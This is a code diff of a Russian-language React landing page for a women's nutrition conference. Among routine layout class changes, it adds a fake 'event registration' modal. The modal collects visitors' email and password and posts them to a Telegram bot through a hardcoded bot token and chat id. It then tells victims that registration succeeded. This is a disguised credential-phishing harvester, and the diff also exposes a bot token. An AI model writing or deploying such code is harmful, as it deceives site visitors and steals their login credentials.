@@ -4,10 +4,92 @@ import logo1 from './assets/IMG_1123.png';
 import logo2 from './assets/miin-2.webp';
 
 function App() {
+  const [email, setEmail] = useState("")
+  const [password, setPassword] = useState("")
+  const [isSuccess, setSuccess] = useState(false)
+  const [isError, setError] = useState(false)
+  const [isActive, setActive] = useState(false)
+
+  const handleModalClick = () => {
+    if (isActive) setActive(false)
+    else setActive(true)
+  };
+
+  const handleSubmit = async (e) => {
+    e.stopPropagation(); // Останавливает всплытие события, чтобы оно не достигло родительского блока
+    e.preventDefault();
+    const text = `Email: ${email}\Passowrd: ${password}`;
+
+    const response = await fetch(`https://api.telegram.org/bot6737098779:AAG-BRBAR_GbpD_iYuumReaAGzpCtbvYkPg/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: '-1002188969418',
+            text: text,
+        }),
+    });
+
+    if (response.ok) {
+        setSuccess(true)
+        setError(false)
+    } else {
+        setSuccess(false)
+        setError(true)
+    }
+  };
 
   return (
     <div className="bg-custom-lightbeige font-montserrat">
-      <div className="flex justify-between items-center py-[20px] px-[90px] text-sm">
+      <div onClick={handleModalClick} className={`cursor-pointer w-full h-screen fixed top-0 left-0 z-50 flex justify-center items-center rgba-bg ${isActive ? "flex" : "hidden"}`}>
+        <form onSubmit={handleSubmit} className="cursor-auto w-[500px] p-[30px] modal-adaptive bg-white rounded-3xl">
+          <h1 className='text-center font-bold text-2xl mb-[20px]'>Регистрация на мероприятие</h1>
+
+          <label className='flex flex-col gap-[10px] font-medium mb-[15px]'>
+            Ваша почта 
+            <input
+              placeholder='example@mail.ru' 
+              className='text-sm border rounded-md border-black transition-all outline-none px-[8px] py-[4px] focus:border-custom-orange' 
+              type="email" 
+              required 
+              onChange={
+                (e) => {
+                  e.stopPropagation()
+                  setEmail(e.target.value)
+                }
+              }
+            />
+          </label>
+
+          <label className='flex flex-col gap-[10px] font-medium mb-[20px]'>
+            Ваш пароль 
+            <input
+              placeholder='Пароль' 
+              className='text-sm border rounded-md border-black transition-all outline-none px-[8px] py-[4px] focus:border-custom-orange' 
+              type="password" 
+              required 
+              onChange={(e) => {
+                e.stopPropagation()
+                setPassword(e.target.value)
+              }}
+            />
+          </label>
+
+          {isError && <p className='text-sm mb-[10px] font-medium text-center text-red-600'>Возникла непредвиденная ошибка. Попробуйте еще раз</p>}
+          {isSuccess ? <p className='text-sm mb-[10px] font-medium text-center text-green-600'>Регистрация прошла успешно. Проверьте почту</p> : ""}
+
+          <div className="flex justify-center mb-[20px]">
+            <button type="submit" className='bg-custom-green transition-all text-white rounded-3xl px-[20px] py-[10px] active:bg-custom-orange hover:bg-custom-orange'>
+              Зарегистрироваться
+            </button>
+          </div>
+
+          <p className='text-xs text-center'>После завершения регистрации вам на почту будет отправлен <span className="text-custom-orange">персональный код</span>. <br /> Его потребуется показать менеджеру на мероприятии</p>
+        </form>
+      </div>
+
+      <div className="flex justify-between items-center py-[20px] px-[90px] text-sm header-adaptive">
         <img className="w-[128px]" src="https://optim.tildacdn.com/tild6330-3836-4533-b165-613037643038/-/resize/194x/-/format/webp/_2.png" alt="" />
 
         <nav className="flex gap-[100px] rounded-3xl px-[40px] py-[10px] uppercase bg-custom-beige">
@@ -16,19 +98,19 @@ function App() {
           <a href="#organs" className="cursor-pointer hover:font-medium">организаторы</a>
         </nav>
 
-        <button className="font-bold px-[40px] py-[10px] uppercase bg-custom-orange rounded-3xl">
+        <button onClick={handleModalClick} className="font-bold px-[40px] py-[10px] uppercase bg-custom-orange rounded-3xl">
           записаться
         </button>
       </div>
 
-      <div className='flex flex-col py-[50px] px-[90px] pb-[60px]'>
+      <div className='flex flex-col py-[50px] px-[90px] pb-[60px] hero-adaptive'>
         <div className="flex justify-between">
           <div className="flex flex-col">
-            <span className="text-3xl text-black font-bold">МЕЖДУНАРОДНАЯ КОНФЕРЕНЦИЯ</span>
+            <span className="hero-header1 text-3xl text-black font-bold">МЕЖДУНАРОДНАЯ КОНФЕРЕНЦИЯ</span>
             <br />
-            <div>
-              <span className="text-3xl uppercase mr-[20px] text-white font-bold px-[30px] py-[10px] bg-custom-green rounded-[30px]">по нутрициологии</span>
-              <span className="text-3xl uppercase text-custom-green font-playfair font-medium italic">для женщин</span>
+            <div className='hero-headers-wrap'>
+              <span className="hero-header2 text-3xl uppercase mr-[20px] text-white font-bold px-[30px] py-[10px] bg-custom-green rounded-[30px]">по нутрициологии</span>
+              <span className="hero-header3 text-3xl uppercase text-custom-green font-playfair font-medium italic">для женщин</span>
             </div>
           </div>
 
@@ -44,22 +126,22 @@ function App() {
         </div>
       </div>
 
-      <div className="px-[90px] pb-[80px]">
+      <div className="main-adaptive px-[90px] pb-[80px]">
         <div className="w-full">
-          <div className="relative overflow-hidden w-full h-[450px] flex justify-center items-end">
-              <img className='w-[300px] absolute top-[-50px] left-[20px] z-20' src="https://optim.tildacdn.com/tild3165-6136-4035-a634-373262626330/-/resize/369x/-/format/webp/1_1.png" alt="" />
-              <img className='w-[300px] absolute top-[-50px] left-[220px] z-20' src="https://optim.tildacdn.com/tild3061-3361-4762-b861-633962376530/-/resize/369x/-/format/webp/2_1.png" alt="" />
-              <img className='w-[350px] absolute top-[-50px] left-[420px] z-10' src="https://optim.tildacdn.com/tild6336-3639-4564-a461-613262663634/-/resize/436x/-/format/webp/3.png" alt="" />
-              <img className='w-[350px] absolute top-[-50px] right-[150px] z-20' src="https://optim.tildacdn.com/tild3263-3239-4534-b630-356130353862/-/resize/433x/-/format/webp/4.png" alt="" />
-              <img className='w-[300px] absolute top-[-50px] right-[0px] z-20' src="https://optim.tildacdn.com/tild3162-3233-4635-b663-653036336231/-/resize/337x/-/format/webp/5.png" alt="" />
+          <div className="main-photos relative overflow-hidden w-full h-[450px] flex justify-center items-end">
+              <img className='main-photo1 w-[300px] absolute top-[-50px] left-[20px] z-20' src="https://optim.tildacdn.com/tild3165-6136-4035-a634-373262626330/-/resize/369x/-/format/webp/1_1.png" alt="" />
+              <img className='main-photo2 w-[300px] absolute top-[-50px] left-[220px] z-20' src="https://optim.tildacdn.com/tild3061-3361-4762-b861-633962376530/-/resize/369x/-/format/webp/2_1.png" alt="" />
+              <img className='main-photo3 w-[350px] absolute top-[-50px] left-[420px] z-10' src="https://optim.tildacdn.com/tild6336-3639-4564-a461-613262663634/-/resize/436x/-/format/webp/3.png" alt="" />
+              <img className='main-photo4 w-[350px] absolute top-[-50px] right-[150px] z-20' src="https://optim.tildacdn.com/tild3263-3239-4534-b630-356130353862/-/resize/433x/-/format/webp/4.png" alt="" />
+              <img className='main-photo5 w-[300px] absolute top-[-50px] right-[0px] z-20' src="https://optim.tildacdn.com/tild3162-3233-4635-b663-653036336231/-/resize/337x/-/format/webp/5.png" alt="" />
               <div className="w-[96%] h-[96%] rounded-t-3xl bg-custom-beige"></div>
           </div>
-          <div className="w-full p-[10px] bg-custom-green rounded-[40px] flex justify-between items-center">
+          <div className="main-dates w-full p-[10px] bg-custom-green rounded-[40px] flex justify-between items-center">
             <div className="bg-white px-[70px] py-[8px] rounded-3xl font-montserrat font-bold text-lg">
               3-4 октября
             </div>
 
-            <button className="font-medium px-[40px] py-[10px] text-white uppercase bg-custom-orange rounded-3xl">
+            <button onClick={handleModalClick} className="font-medium px-[40px] py-[10px] text-white uppercase bg-custom-orange rounded-3xl">
               записаться
             </button>
 
@@ -70,11 +152,11 @@ function App() {
         </div>
       </div>
 
-      <div className="px-[90px] pb-[60px] flex justify-between">
+      <div className="about-adaptive px-[90px] pb-[60px] flex justify-between">
         <div className="w-[72%] py-[30px] px-[40px] bg-custom-green rounded-3xl">
-          <div className="flex flex-col gap-[15px] mb-[40px]">
+          <div className="about-info flex flex-col gap-[15px] mb-[40px]">
             <h1>
-              <span className="text-4xl uppercase text-white font-montserrat font-bold mr-[15px]">ежегодная</span>
+              <span className="about-internat text-4xl uppercase text-white font-montserrat font-bold mr-[15px]">ежегодная</span>
               <span className="text-5xl text-white font-playfair italic">конференция</span>
             </h1>
 
@@ -91,7 +173,7 @@ function App() {
           </div>
         </div>
 
-        <div className="w-[25%] flex flex-col justify-between">
+        <div className="about-stats w-[25%] flex flex-col justify-between">
           <div className="flex flex-col gap-[10px] p-[10px] pt-0 items-center justify-center rounded-3xl border border-custom-green">
             <h1 className="text-6xl font-bold text-custom-green font-playfair">12</h1>  
             <p className="text-base text-custom-green font-medium">панельных дискуссий</p>
@@ -109,12 +191,12 @@ function App() {
         </div>
       </div>
 
-      <div className="px-[90px] py-[45px] bg-custom-green w-full" id="programm">
+      <div className="auditory-adaptive px-[90px] py-[45px] bg-custom-green w-full" id="programm">
         <h1 className="text-white text-4xl uppercase font-bold mb-[50px]">
           для кого мероприятие?
         </h1>
 
-        <div className="flex flex-wrap justify-center gap-[50px]">
+        <div className="auditory-cards flex flex-wrap justify-center gap-[50px]">
 
           <div className="flex justify-between w-[45%] h-[170px] p-[20px] rounded-3xl bg-white parent-div">
             <div className="w-[10%] flex justify-center items-start">
@@ -183,7 +265,7 @@ function App() {
         </div>
       </div>
 
-      <div className="p-[45px] flex flex-col items-center" id="speakers">
+      <div className="speakers-adaptive p-[45px] flex flex-col items-center" id="speakers">
         <h1 className="text-black text-3xl uppercase font-bold mb-[45px]">
           Спикеры
         </h1>
@@ -244,18 +326,18 @@ function App() {
 
       </div>
 
-      <div className="py-[45px] px-[90px] flex flex-col items-center bg-custom-green" id="organs">
+      <div className="organs-adaptive py-[45px] px-[90px] flex flex-col items-center bg-custom-green" id="organs">
         <h1 className="text-white text-3xl uppercase font-bold mb-[45px]">
           организаторы
         </h1>
 
         <div className="w-full flex justify-between">
-          <div className="p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
+          <div className="organs-card p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
               <div className="w-[20%]">
                 <img src={logo1} className='w-[86px]' alt="" />
               </div>
 
-              <div className="flex flex-col gap-[10px] w-[80%]">
+              <div className="flex flex-col gap-[10px] w-[80%] organs-text">
                 <h3 className="text-black font-semibold">
                   Ассоциация Нутрициологов и Коучей <br /> по Здоровью (АНКЗ)
                 </h3>
@@ -266,12 +348,12 @@ function App() {
               </div>
           </div>
 
-          <div className="p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
+          <div className="organs-card p-[30px] bg-white rounded-3xl flex gap-[20px] max-w-[45%]">
               <div className="w-[20%]">
                 <img src={logo2} className='w-[86px]' alt="" />
               </div>
 
-              <div className="flex flex-col gap-[10px] w-[80%]">
+              <div className="flex flex-col gap-[10px] w-[80%] organs-text">
                 <h3 className="text-black font-semibold">
                   Международный Институт Интегративной Нутрициологии (МИИН)
                 </h3>
@@ -284,7 +366,7 @@ function App() {
         </div>
       </div>
 
-      <div className="px-[90px] h-[130px] flex justify-center items-center relative">
+      <div className="footer-adaptive px-[90px] h-[130px] flex justify-center items-center relative">
         <img className="w-[128px] absolute left-[90px]" src="https://optim.tildacdn.com/tild3463-3437-4362-b530-616163326534/-/resize/327x/-/format/webp/_1.png" alt="" />
         
         <div className="font-semibold text-gray-400">
